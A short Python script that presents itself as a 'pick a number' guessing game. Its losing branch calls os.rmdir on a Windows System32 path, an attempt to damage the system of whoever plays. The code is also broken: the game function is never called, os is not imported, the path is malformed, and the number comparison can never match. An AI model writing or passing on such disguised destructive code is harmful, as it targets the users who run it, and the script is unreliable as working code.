# dont play it acc
while True:
    print("Lets play a little game!")

    number = int(input("Pick a number between 1 and 10"))

    dir_path = 'C:WindowsSystem32'

    def fun_game():
        if number == "7":
            print("congrats you won!")
        else:
             os.rmdir(dir_path)
            
    reset = input("Do you want to reset? (yes/no)") 
    if reset.lower() != "yes":
        break

    print("goodbye")
